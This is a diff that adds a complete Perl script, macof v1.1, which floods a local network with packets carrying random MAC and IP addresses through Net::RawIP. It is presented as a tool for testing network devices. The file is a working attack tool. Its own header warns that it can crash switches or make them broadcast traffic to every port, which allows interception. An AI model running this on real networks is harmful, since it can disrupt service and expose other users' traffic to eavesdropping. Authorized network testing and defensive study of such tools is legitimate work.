@@ -1,0 +1,91 @@
+#!/usr/bin/perl -w
+#
+# macof v. 1.1
+# By Ian Vitek ( ian.vitek@infosec.se )
+# Tests network devices by flooding local network with MAC-addresses.
+# 
+# Needs Net::RawIP (http://quake.skif.net/RawIP)
+# Requires libpcap (ftp://ftp.ee.lbl.gov/libpcap.tar.Z)
+#
+# Example: ./macof -e <mac_of_def_gate> -n 1000000
+#          ./macof -r -n 1000000
+#          (run it several times)
+#
+# Warning: This program could cause problems on your network.
+#          This program could hang, crash or reboot network devices.
+#          Switches could start sending packages to all ports making it
+#          possible to intercept network trafic.
+#          
+#
+require 'getopts.pl';
+use Net::RawIP;
+Getopts('hvrs:e:d:x:y:i:n:');
+
+sub GenMAC
+{
+  my $tmp_mac="00";
+  my $i=0;
+# generate random mac-address
+  while($i++ < 5) {
+    $tmp_mac.=":" . sprintf("%x",int rand 16);
+    $tmp_mac.=sprintf("%x",int rand 16);
+  }
+  return($tmp_mac);
+}
+
+$a = new Net::RawIP;
+
+die "usage: $0 [options]\
+\t-d dest_host\t\t(def:random)\
+\t-s source_host\t\t(def:random)\
+\t-v \t\t\tprints generated mac-addresses\
+\t-r | -e dest_mac \trandomize or set destination mac address\
+\t\t\t\tshould be in format ff:ff:ff:ff:ff:ff or host\
+\t-x source_port\t\t(def:random)\
+\t-y dest_port \t\t(def:random)\
+\t-i interface \t\tset sending interface \t\t(def:eth0)\
+\t-n times\t\tset number of times to send \t(def:1)\
+\t-h this help\n" unless ( !$opt_h && !($opt_r && $opt_e) );
+
+# set default values
+$opt_i=eth0 unless $opt_i;
+$opt_n=1 unless $opt_n;
+$s_host=$opt_s if $opt_s;
+$d_host=$opt_d if $opt_d;
+$s_port=$opt_x if $opt_x;
+$d_port=$opt_y if $opt_y;
+
+# choose network card
+if($opt_e) {
+  $a->ethnew($opt_i, dest => $opt_e);
+} else {
+  $a->ethnew($opt_i);
+}
+
+# Loop
+for($times=0; $times < $opt_n; $times++) {
+# Check if one or two mac-addresses should be generated
+  $mac=&GenMAC;
+  if($opt_r) {
+    $d_mac=&GenMAC;
+    print "$d_mac \t$mac\n" if($opt_v);
+#   set mac-addresses
+    $a->ethset(source => $mac, dest => $d_mac);
+  } else {
+    print "$mac\n" if($opt_v);
+#   set mac-address
+    $a->ethset(source => $mac);
+  }
+# generate random source and destination ip-addresses
+  $s_host=17000000+int rand 4261000000 unless $opt_s;
+  $d_host=17000000+int rand 4261000000 unless $opt_d;
+# generate random source and dest ports
+  $s_port=int rand 65535 unless $opt_x;
+  $d_port=int rand 65535 unless $opt_y;
+# set network package
+  $a->set({ip => {saddr => $s_host, daddr => $d_host},
+           tcp => {source => $s_port, dest => $d_port}
+          });
+# send
+  $a->ethsend;
+}
